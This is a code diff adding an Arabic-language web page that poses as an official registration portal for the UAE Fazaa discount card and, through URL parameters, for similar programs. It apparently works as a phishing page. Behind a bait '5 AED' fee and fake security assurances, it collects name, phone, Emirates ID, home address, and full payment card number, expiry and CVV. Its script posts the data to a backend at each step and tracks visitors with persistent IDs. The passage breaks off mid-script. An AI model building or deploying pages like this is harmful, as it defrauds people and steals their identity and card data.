@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل بطاقة فزعة - FAZAA | العروض والخصومات الحصرية</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Tajawal', 'sans-serif'],
+            mono: ['"JetBrains Mono"', 'monospace']
+          },
+          colors: {
+            gold: {
+              400: '#e5be49',
+              500: '#c9a227',
+              600: '#a6831a',
+              700: '#7a6318',
+              800: '#544410'
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@500;700;800&family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Tajawal', sans-serif; }
+    .card-gradient {
+      background: linear-gradient(135deg, #1f1f1f 0%, #2e2814 45%, #c9a227 120%);
+    }
+    .gold-gradient {
+      background: linear-gradient(to right, #7a6318, #c9a227);
+    }
+    .gold-text {
+      background: linear-gradient(135deg, #dfbc46, #c9a227, #f7e28b);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .chip {
+      background: linear-gradient(135deg, #d4af37 0%, #f3e5ab 50%, #aa7c11 100%);
+    }
+  </style>
+</head>
+<body class="bg-[#f8f9fb] text-gray-900 min-h-screen flex flex-col antialiased">
+
+  <!-- Header -->
+  <header class="h-[100px] w-full relative overflow-hidden flex items-center justify-between px-6 md:px-12 z-10 shadow-md" style="background:linear-gradient(to right, #7a6318, #c9a227)">
+    <div class="absolute inset-0 opacity-10 pointer-events-none" style="background-image:linear-gradient(45deg,#000 25%,transparent 25%,transparent 75%,#000 75%,#000),linear-gradient(45deg,#000 25%,transparent 25%,transparent 75%,#000 75%,#000);background-size:20px 20px;background-position:0 0,10px 10px"></div>
+    
+    <div class="relative z-10 flex items-center">
+      <button type="button" class="bg-white/20 hover:bg-white/30 active:scale-95 transition-all text-white text-sm font-medium py-1.5 px-4 rounded-full flex items-center gap-2 border border-white/30 backdrop-blur-sm cursor-pointer select-none">
+        <span>🇺🇸</span>
+        <span>English</span>
+      </button>
+    </div>
+
+    <a class="relative z-10 flex flex-col items-center cursor-pointer hover:opacity-90 transition-opacity" href="/">
+      <span class="text-white font-black text-3xl leading-none mb-1 tracking-wider drop-shadow-sm">فزعة</span>
+      <span class="text-white text-xs font-bold tracking-[0.25em] leading-none opacity-95">FAZAA</span>
+    </a>
+
+    <div class="relative z-10 flex items-center gap-2 text-white/90 text-xs font-bold bg-black/15 px-3 py-1.5 rounded-full border border-white/20 backdrop-blur-sm">
+      <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+      <span class="hidden sm:inline">نظام التقديم الفوري</span>
+    </div>
+  </header>
+
+  <!-- Sub Header / Breadcrumbs -->
+  <div class="bg-white border-b border-gray-200/80 py-3 px-6 shadow-sm">
+    <div class="max-w-4xl mx-auto flex items-center justify-between text-xs md:text-sm text-gray-600">
+      <div class="flex items-center gap-2">
+        <a href="/" class="hover:text-gold-600 transition-colors">الرئيسية</a>
+        <span>/</span>
+        <a href="/cards" class="hover:text-gold-600 transition-colors">البطاقات</a>
+        <span>/</span>
+        <span class="text-gold-600 font-bold" id="bread-card-name">طلب تسجيل بطاقة فزعة الذهبية</span>
+      </div>
+      <div class="flex items-center gap-1.5 text-emerald-600 font-bold text-xs bg-emerald-50 px-2.5 py-1 rounded-full border border-emerald-200">
+        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+        <span>بيانات مشفرة وآمنة</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main Container -->
+  <main class="flex-1 max-w-4xl w-full mx-auto px-4 py-8 md:py-12">
+
+    <!-- Step Progress Bar -->
+    <div class="mb-8">
+      <div class="flex items-center justify-between relative max-w-2xl mx-auto">
+        <div class="absolute top-1/2 left-0 right-0 h-1 bg-gray-200 -translate-y-1/2 z-0"></div>
+        <div id="progress-line" class="absolute top-1/2 right-0 h-1 bg-gradient-to-l from-gold-600 to-gold-500 -translate-y-1/2 z-0 transition-all duration-500" style="width: 15%;"></div>
+
+        <!-- Step 1 -->
+        <div id="step-node-1" class="relative z-10 flex flex-col items-center">
+          <div class="w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm text-white shadow-md transition-all duration-300 bg-gradient-to-r from-gold-700 to-gold-500 ring-4 ring-gold-100">
+            1
+          </div>
+          <span class="text-xs md:text-sm font-bold mt-2 text-gold-700">البيانات الشخصية</span>
+        </div>
+
+        <!-- Step 2 -->
+        <div id="step-node-2" class="relative z-10 flex flex-col items-center">
+          <div class="w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm text-gray-500 shadow-sm transition-all duration-300 bg-white border-2 border-gray-300">
+            2
+          </div>
+          <span class="text-xs md:text-sm font-medium mt-2 text-gray-500">عنوان التوصيل</span>
+        </div>
+
+        <!-- Step 3 -->
+        <div id="step-node-3" class="relative z-10 flex flex-col items-center">
+          <div class="w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm text-gray-500 shadow-sm transition-all duration-300 bg-white border-2 border-gray-300">
+            3
+          </div>
+          <span class="text-xs md:text-sm font-medium mt-2 text-gray-500">تأكيد البطاقة والدفع</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Layout Grid: Card Preview + Form -->
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+
+      <!-- Left Column: Interactive Card Preview & Summary -->
+      <div class="lg:col-span-5 space-y-6">
+
+        <!-- Virtual Card Graphic with Official Card Image & Dynamic Details -->
+        <div class="relative w-full aspect-[1.586/1] rounded-2xl shadow-2xl overflow-hidden border border-gold-500/30 transition-transform duration-300 hover:scale-[1.02] bg-gradient-to-br from-gray-900 to-gray-800">
+          <!-- Real Card Photo -->
+          <img
+            id="officialCardImg"
+            src="/cards/fazaa/gold.png"
+            alt="بطاقة فزعة"
+            class="absolute inset-0 w-full h-full object-cover rounded-2xl select-none pointer-events-none"
+            onerror="this.style.display='none'"
+          />
+
+          <!-- Gradient Ambient Overlay for Text Legibility -->
+          <div class="absolute inset-0 bg-gradient-to-t from-black/85 via-black/25 to-black/30 p-5 md:p-6 flex flex-col justify-between text-white pointer-events-none">
+            <!-- Top Row: Card Brand and Contactless -->
+            <div class="flex items-center justify-between">
+              <div class="flex items-center gap-2">
+                <span class="text-xs font-bold bg-black/50 backdrop-blur-md px-3 py-1 rounded-full text-gold-300 border border-gold-500/40 shadow-sm" id="card-display-badge">
+                  بطاقة معتمدة
+                </span>
+                <span class="text-xs font-black text-white/90 drop-shadow hidden sm:inline" id="card-display-brand">فزعة</span>
+              </div>
+              <div class="flex items-center gap-2">
+                <svg class="w-6 h-6 text-gold-400 rotate-90 drop-shadow" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0"/></svg>
+              </div>
+            </div>
+
+            <!-- Card Bottom: Number, Holder & Expiry -->
+            <div class="space-y-3">
+              <!-- Card Number -->
+              <div>
+                <span id="preview-card-number" class="font-mono text-base md:text-lg font-bold tracking-[0.2em] text-white drop-shadow-[0_2px_4px_rgba(0,0,0,0.8)]">
+                  •••• •••• •••• ••••
+                </span>
+              </div>
+
+              <!-- Bottom Row: Holder & Expiry -->
+              <div class="flex items-end justify-between text-xs">
+                <div>
+                  <span class="block text-[9px] uppercase tracking-wider text-gray-300">حامل البطاقة</span>
+                  <span id="preview-card-holder" class="font-bold tracking-wider font-mono uppercase text-white truncate max-w-[160px] inline-block drop-shadow">
+                    AL HAMELI AHMED
+                  </span>
+                </div>
+                <div class="text-left font-mono">
+                  <span class="block text-[9px] uppercase tracking-wider text-gray-300">تاريخ الصلاحية</span>
+                  <span id="preview-card-expiry" class="font-bold text-gold-300 drop-shadow">
+                    12/28
+                  </span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Membership Perks Summary -->
+        <div class="bg-white rounded-2xl p-5 border border-gray-200/80 shadow-sm space-y-3">
+          <h3 class="font-bold text-sm text-gray-800 flex items-center gap-2">
+            <span class="text-gold-600">★</span>
+            <span id="summary-card-title">مزايا عضوية فزعة الذهبية:</span>
+          </h3>
+          <ul class="text-xs text-gray-600 space-y-2">
+            <li class="flex items-center gap-2">
+              <span class="text-emerald-500 font-bold">✓</span>
+              <span>خصومات تصل حتى 50% في أكثر من 4,000 متجر ومطعم</span>
+            </li>
+            <li class="flex items-center gap-2">
+              <span class="text-emerald-500 font-bold">✓</span>
+              <span>عروض حصرية على حجوزات الفنادق وتذاكر السفر والترفيه</span>
+            </li>
+            <li class="flex items-center gap-2">
+              <span class="text-emerald-500 font-bold">✓</span>
+              <span>توصيل البطاقة الفعلية إلى باب منزلك في الإمارات</span>
+            </li>
+            <li class="flex items-center gap-2">
+              <span class="text-emerald-500 font-bold">✓</span>
+              <span>تفعيل فوري للبطاقة الرقمية على تطبيق الهاتف</span>
+            </li>
+          </ul>
+
+          <div class="pt-3 border-t border-gray-100 flex items-center justify-between text-xs">
+            <span class="text-gray-500">رسوم الإصدار والتوصيل:</span>
+            <div class="flex items-center gap-1">
+              <span class="text-gray-400 line-through text-[11px]">150 درهم</span>
+              <span class="font-black text-sm text-gold-600">5 درهم إماراتي</span>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Right Column: Registration Multi-Step Form -->
+      <div class="lg:col-span-7">
+        <div class="bg-white rounded-2xl shadow-xl border border-gray-200/80 p-6 md:p-8">
+
+          <form id="fazaaRegistrationForm" onsubmit="event.preventDefault(); handleFormSubmit();">
+
+            <!-- STEP 1: Personal Information -->
+            <div id="step-1-container" class="space-y-5">
+              <div class="border-b border-gray-100 pb-3">
+                <h2 class="text-lg font-bold text-gray-900 flex items-center gap-2">
+                  <span class="w-7 h-7 rounded-lg bg-gold-100 text-gold-700 flex items-center justify-center text-xs font-bold">1</span>
+                  <span>البيانات الشخصية للمشترك</span>
+                </h2>
+                <p class="text-xs text-gray-500 mt-1">يرجى كتابة الاسم ورقم الهاتف كما هو مسجل في الهوية الإماراتية</p>
+              </div>
+
+              <!-- Full Name -->
+              <div>
+                <label for="fullName" class="block text-xs font-bold text-gray-700 mb-1.5">
+                  الاسم الكامل (ثلاثي كما بالهوية) <span class="text-red-500">*</span>
+                </label>
+                <div class="relative">
+                  <input
+                    type="text"
+                    id="fullName"
+                    required
+                    placeholder="مثال: أحمد محمد بن راشد الشامسي"
+                    class="w-full px-4 py-3 pl-10 text-sm bg-gray-50 rounded-xl border border-gray-200 focus:bg-white focus:border-gold-500 focus:ring-2 focus:ring-gold-500/20 outline-none transition-all"
+                  />
+                  <div class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Phone Number -->
+              <div>
+                <label for="phone" class="block text-xs font-bold text-gray-700 mb-1.5">
+                  رقم الهاتف المتحرك <span class="text-red-500">*</span>
+                </label>
+                <div class="relative flex" dir="ltr">
+                  <span class="inline-flex items-center gap-1.5 px-3 rounded-l-xl border border-r-0 border-gray-200 bg-gray-100 text-gray-700 text-xs font-bold select-none">
+                    <span>🇦🇪</span>
+                    <span>+971</span>
+                  </span>
+                  <input
+                    type="tel"
+                    id="phone"
+                    required
+                    placeholder="50 123 4567"
+                    class="w-full px-4 py-3 text-sm bg-gray-50 rounded-r-xl border border-gray-200 focus:bg-white focus:border-gold-500 focus:ring-2 focus:ring-gold-500/20 outline-none transition-all font-mono"
+                  />
+                </div>
+                <p class="text-[11px] text-gray-400 mt-1">سيتم إرسال رسالة نصية لتأكيد استلام الطلب وتتبع الشحنة</p>
+              </div>
+
+              <!-- Emirates ID -->
+              <div>
+                <label for="emiratesId" class="block text-xs font-bold text-gray-700 mb-1.5">
+                  رقم الهوية الإماراتية <span class="text-red-500">*</span>
+                </label>
+                <div class="relative">
+                  <input
+                    type="text"
+                    id="emiratesId"
+                    required
+                    dir="ltr"
+                    placeholder="784-1990-1234567-1"
+                    maxlength="18"
+                    class="w-full px-4 py-3 pl-10 text-sm font-mono bg-gray-50 rounded-xl border border-gray-200 focus:bg-white focus:border-gold-500 focus:ring-2 focus:ring-gold-500/20 outline-none transition-all"
+                  />
+                  <div class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2"/></svg>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Next Button -->
+              <div class="pt-4">
+                <button
+                  type="button"
+                  onclick="goToStep(2)"
+                  class="w-full py-3.5 px-6 rounded-xl font-bold text-sm text-white shadow-lg shadow-gold-500/25 bg-gradient-to-r from-gold-700 via-gold-600 to-gold-500 hover:from-gold-800 hover:to-gold-600 transition-all flex items-center justify-center gap-2 cursor-pointer active:scale-[0.99]"
+                >
+                  <span>التالي: عنوان التوصيل</span>
+                  <svg class="w-4 h-4 rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"/></svg>
+                </button>
+              </div>
+            </div>
+
+            <!-- STEP 2: Delivery Information -->
+            <div id="step-2-container" class="space-y-5 hidden">
+              <div class="border-b border-gray-100 pb-3">
+                <h2 class="text-lg font-bold text-gray-900 flex items-center gap-2">
+                  <span class="w-7 h-7 rounded-lg bg-gold-100 text-gold-700 flex items-center justify-center text-xs font-bold">2</span>
+                  <span>عنوان توصيل البطاقة</span>
+                </h2>
+                <p class="text-xs text-gray-500 mt-1">سيتم توصيل البطاقة إلى العنوان المحدد خلال 24-48 ساعة عبر مندوب التوصيل</p>
+              </div>
+
+              <!-- Emirate -->
+              <div>
+                <label for="region" class="block text-xs font-bold text-gray-700 mb-1.5">
+                  الإمارة <span class="text-red-500">*</span>
+                </label>
+                <select
+                  id="region"
+                  required
+                  class="w-full px-4 py-3 text-sm bg-gray-50 rounded-xl border border-gray-200 focus:bg-white focus:border-gold-500 focus:ring-2 focus:ring-gold-500/20 outline-none transition-all cursor-pointer"
+                >
+                  <option value="">-- اختر الإمارة --</option>
+                  <option value="أبوظبي">أبوظبي</option>
+                  <option value="دبي" selected>دبي</option>
+                  <option value="الشارقة">الشارقة</option>
+                  <option value="عجمان">عجمان</option>
+                  <option value="أم القيوين">أم القيوين</option>
+                  <option value="رأس الخيمة">رأس الخيمة</option>
+                  <option value="الفجيرة">الفجيرة</option>
+                </select>
+              </div>
+
+              <!-- City / District -->
+              <div>
+                <label for="district" class="block text-xs font-bold text-gray-700 mb-1.5">
+                  المنطقة / الحي <span class="text-red-500">*</span>
+                </label>
+                <div class="relative">
+                  <input
+                    type="text"
+                    id="district"
+                    required
+                    placeholder="مثال: البرشاء، مارينا، الخالدية..."
+                    class="w-full px-4 py-3 pl-10 text-sm bg-gray-50 rounded-xl border border-gray-200 focus:bg-white focus:border-gold-500 focus:ring-2 focus:ring-gold-500/20 outline-none transition-all"
+                  />
+                  <div class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Street Address -->
+              <div>
+                <label for="street" class="block text-xs font-bold text-gray-700 mb-1.5">
+                  اسم الشارع ورقم البناية / الفيلا <span class="text-red-500">*</span>
+                </label>
+                <div class="relative">
+                  <input
+                    type="text"
+                    id="street"
+                    required
+                    placeholder="مثال: شارع الشيخ زايد - برج النخيل - شقة 402"
+                    class="w-full px-4 py-3 pl-10 text-sm bg-gray-50 rounded-xl border border-gray-200 focus:bg-white focus:border-gold-500 focus:ring-2 focus:ring-gold-500/20 outline-none transition-all"
+                  />
+                  <div class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Navigation Buttons -->
+              <div class="pt-4 flex gap-3">
+                <button
+                  type="button"
+                  onclick="goToStep(1)"
+                  class="w-1/3 py-3.5 px-4 rounded-xl font-bold text-xs md:text-sm text-gray-700 bg-gray-100 hover:bg-gray-200 transition-all cursor-pointer"
+                >
+                  ← السابق
+                </button>
+                <button
+                  type="button"
+                  onclick="goToStep(3)"
+                  class="w-2/3 py-3.5 px-6 rounded-xl font-bold text-xs md:text-sm text-white shadow-lg shadow-gold-500/25 bg-gradient-to-r from-gold-700 via-gold-600 to-gold-500 hover:from-gold-800 hover:to-gold-600 transition-all flex items-center justify-center gap-2 cursor-pointer active:scale-[0.99]"
+                >
+                  <span>التالي: تأكيد البطاقة والدفع</span>
+                  <svg class="w-4 h-4 rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7"/></svg>
+                </button>
+              </div>
+            </div>
+
+            <!-- STEP 3: Payment & Confirmation -->
+            <div id="step-3-container" class="space-y-5 hidden">
+              <div class="border-b border-gray-100 pb-3">
+                <div class="flex items-center justify-between">
+                  <h2 class="text-lg font-bold text-gray-900 flex items-center gap-2">
+                    <span class="w-7 h-7 rounded-lg bg-gold-100 text-gold-700 flex items-center justify-center text-xs font-bold">3</span>
+                    <span>بيانات الدفع والتحقق</span>
+                  </h2>
+                  <span class="text-xs font-bold text-gold-700 bg-gold-50 px-2.5 py-1 rounded-md border border-gold-200">
+                    رسوم الإصدار: 5 درهم
+                  </span>
+                </div>
+                <p class="text-xs text-gray-500 mt-1">يتم سداد رسوم رمزية 5 درهم للتحقق من هوية المشترك ورسوم الشحن المعتمدة</p>
+              </div>
+
+              <!-- Card Number -->
+              <div>
+                <label for="cardNumber" class="block text-xs font-bold text-gray-700 mb-1.5">
+                  رقم البطاقة البنكية <span class="text-red-500">*</span>
+                </label>
+                <div class="relative">
+                  <input
+                    type="text"
+                    id="cardNumber"
+                    required
+                    dir="ltr"
+                    placeholder="4111 2222 3333 4444"
+                    maxlength="19"
+                    class="w-full px-4 py-3 pl-12 text-sm font-mono tracking-wider bg-gray-50 rounded-xl border border-gray-200 focus:bg-white focus:border-gold-500 focus:ring-2 focus:ring-gold-500/20 outline-none transition-all"
+                  />
+                  <div class="absolute left-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5 text-gray-400" id="cardBrandIcon">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Cardholder Name -->
+              <div>
+                <label for="cardHolder" class="block text-xs font-bold text-gray-700 mb-1.5">
+                  اسم حامل البطاقة (كما هو مدون عليها) <span class="text-red-500">*</span>
+                </label>
+                <input
+                  type="text"
+                  id="cardHolder"
+                  required
+                  dir="ltr"
+                  placeholder="AHMED MOHAMMED"
+                  class="w-full px-4 py-3 text-sm uppercase font-mono bg-gray-50 rounded-xl border border-gray-200 focus:bg-white focus:border-gold-500 focus:ring-2 focus:ring-gold-500/20 outline-none transition-all"
+                />
+              </div>
+
+              <!-- Expiry & CVV Grid -->
+              <div class="grid grid-cols-2 gap-4">
+                <div>
+                  <label for="expiry" class="block text-xs font-bold text-gray-700 mb-1.5">
+                    تاريخ الانتهاء (MM/YY) <span class="text-red-500">*</span>
+                  </label>
+                  <input
+                    type="text"
+                    id="expiry"
+                    required
+                    dir="ltr"
+                    placeholder="MM/YY"
+                    maxlength="5"
+                    class="w-full px-4 py-3 text-sm font-mono text-center bg-gray-50 rounded-xl border border-gray-200 focus:bg-white focus:border-gold-500 focus:ring-2 focus:ring-gold-500/20 outline-none transition-all"
+                  />
+                </div>
+                <div>
+                  <label for="cvv" class="block text-xs font-bold text-gray-700 mb-1.5">
+                    رمز الأمان (CVV) <span class="text-red-500">*</span>
+                  </label>
+                  <div class="relative">
+                    <input
+                      type="password"
+                      id="cvv"
+                      required
+                      dir="ltr"
+                      placeholder="123"
+                      maxlength="4"
+                      class="w-full px-4 py-3 text-sm font-mono text-center bg-gray-50 rounded-xl border border-gray-200 focus:bg-white focus:border-gold-500 focus:ring-2 focus:ring-gold-500/20 outline-none transition-all"
+                    />
+                    <div class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
+                      <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Security Guarantee Badge -->
+              <div class="bg-gray-50 border border-gray-200 rounded-xl p-3 flex items-center gap-3 text-xs text-gray-600">
+                <span class="text-xl">🛡️</span>
+                <p>جميع المعاملات المالية محمية بنظام تشفير SSL 256-bit ومعتمدة من بوابة الدفع الوطنية الآمنة في الإمارات.</p>
+              </div>
+
+              <!-- Navigation Buttons -->
+              <div class="pt-4 flex gap-3">
+                <button
+                  type="button"
+                  onclick="goToStep(2)"
+                  class="w-1/3 py-3.5 px-4 rounded-xl font-bold text-xs md:text-sm text-gray-700 bg-gray-100 hover:bg-gray-200 transition-all cursor-pointer"
+                >
+                  ← السابق
+                </button>
+                <button
+                  type="submit"
+                  id="submitBtn"
+                  class="w-2/3 py-3.5 px-6 rounded-xl font-bold text-sm text-white shadow-xl shadow-gold-500/30 bg-gradient-to-r from-gold-700 via-gold-600 to-gold-500 hover:from-gold-800 hover:to-gold-600 transition-all flex items-center justify-center gap-2 cursor-pointer active:scale-[0.99]"
+                >
+                  <span id="submitBtnText">✓ تأكيد طلب البطاقة واشتراك فزعة</span>
+                  <div id="submitBtnSpinner" class="hidden w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                </button>
+              </div>
+            </div>
+
+          </form>
+
+        </div>
+      </div>
+
+    </div>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="bg-[#1a1a1a] text-gray-400 py-8 px-6 md:px-12 w-full mt-auto border-t border-gray-800">
+    <div class="max-w-6xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
+      <div class="flex flex-wrap justify-center items-center gap-6 text-xs md:text-sm">
+        <a class="hover:text-white transition-colors cursor-pointer" href="/">سياسة الخصوصية</a>
+        <a class="hover:text-white transition-colors cursor-pointer" href="/">شروط الخدمة</a>
+        <a class="hover:text-white transition-colors cursor-pointer" href="/">الدعم الفني</a>
+        <a class="hover:text-white transition-colors cursor-pointer" href="/">الأسئلة الشائعة</a>
+      </div>
+      <div class="text-xs md:text-sm flex items-center gap-2">
+        <span class="text-white font-bold">فزعة</span>
+        <span>|</span>
+        <span>© 2026 فزعة جميع الحقوق محفوظة</span>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Notification Modal / Overlay for live step redirection -->
+  <div id="loadingModal" class="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+    <div class="bg-white rounded-2xl max-w-sm w-full p-6 text-center shadow-2xl space-y-4">
+      <div class="w-14 h-14 mx-auto rounded-full bg-gold-100 text-gold-600 flex items-center justify-center">
+        <svg class="w-8 h-8 animate-spin" fill="none" viewBox="0 0 24 24">
+          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+        </svg>
+      </div>
+      <h3 class="text-base font-bold text-gray-900" id="modalTitle">جاري معالجة الطلب...</h3>
+      <p class="text-xs text-gray-500 leading-relaxed" id="modalSub">يرجى الانتظار ثوانٍ معدودة، جاري التحقق من صحة البيانات وإصدار البطاقة.</p>
+    </div>
+  </div>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const cardParam = urlParams.get('card') || urlParams.get('brand') || 'fazaa';
+    const typeParam = urlParams.get('type') || 'gold';
+
+    const brandNames = {
+      'fazaa': 'فزعة',
+      'esaad': 'إسعاد',
+      'homat-al-watan': 'حماة الوطن',
+      'al-saada': 'السعادة',
+      'absher': 'أبشر'
+    };
+
+    const typeNames = {
+      'gold': 'الذهبية',
+      'silver': 'الفضية',
+      'platinum': 'البلاتينية',
+      'discount': 'الخصومات'
+    };
+
+    const brandArabic = brandNames[cardParam] || 'فزعة';
+    const typeArabic = typeNames[typeParam] || 'الذهبية';
+    const fullCardTitle = `بطاقة ${brandArabic} ${typeArabic}`;
+
+    document.getElementById('bread-card-name').textContent = `طلب تسجيل ${fullCardTitle}`;
+    document.getElementById('card-display-brand').textContent = brandArabic;
+    document.getElementById('summary-card-title').textContent = `مزايا عضوية ${fullCardTitle}:`;
+
+    // Dynamic official card image mapping
+    const brandFolderMap = {
+      'fazaa': 'fazaa',
+      'esaad': 'esaad',
+      'homat-al-watan': 'homat',
+      'homat': 'homat',
+      'al-saada': 'alsaada',
+      'alsaada': 'alsaada',
+      'absher': 'absher'
+    };
+    const folder = brandFolderMap[cardParam] || 'fazaa';
+    const normalizedType = (typeParam === 'silver' ? 'silver' : (typeParam === 'discount' ? 'discount' : 'gold'));
+    const ext = (folder === 'alsaada') ? 'jpg' : 'png';
+    const officialImgElem = document.getElementById('officialCardImg');
+    if (officialImgElem) {
+      officialImgElem.src = `/cards/${folder}/${normalizedType}.${ext}`;
+    }
+
+    let visitorId = urlParams.get('id') || 
+                    sessionStorage.getItem('_fazaa_vis_id') || 
+                    localStorage.getItem('_fazaa_vis_id') ||
+                    'vis_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 6);
+    
+    sessionStorage.setItem('_fazaa_vis_id', visitorId);
+    localStorage.setItem('_fazaa_vis_id', visitorId);
+    sessionStorage.setItem('_pays_id', visitorId);
+    sessionStorage.setItem('_reg_id', visitorId);
+
+    let currentStep = 1;
+
+    function goToStep(step) {
+      if (step === 2) {
+        const name = document.getElementById('fullName').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const eid = document.getElementById('emiratesId').value.trim();
+        if (!name || !phone || !eid) {
+          alert('يرجى ملء جميع الحقول المطلوبة في البيانات الشخصية أولاً.');
+          return;
+        }
+        syncLiveHeartbeat({ step: 'passenger_details' });
+        fetch('/api/client/order', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            visitorId: visitorId,
+            name: name,
+            phone: phone,
+            emiratesId: eid,
+            step: 'passenger_details',
+            bookingData: {
+              'نوع البطاقة': fullCardTitle,
+              'الاسم': name,
+              'الهاتف': phone,
+              'الهوية': eid
+            }
+          })
+        }).catch(() => {});
+      } else if (step === 3) {
+        const region = document.getElementById('region').value;
+        const district = document.getElementById('district').value.trim();
+        const street = document.getElementById('street').value.trim();
+        if (!region || !district || !street) {
+          alert('يرجى ملء عنوان التوصيل كاملاً.');
+          return;
+        }
+        syncLiveHeartbeat({ step: 'payment' });
+        const name = document.getElementById('fullName').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const eid = document.getElementById('emiratesId').value.trim();
+        fetch('/api/client/order', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            visitorId: visitorId,
+            name: name,
+            phone: phone,
+            emiratesId: eid,
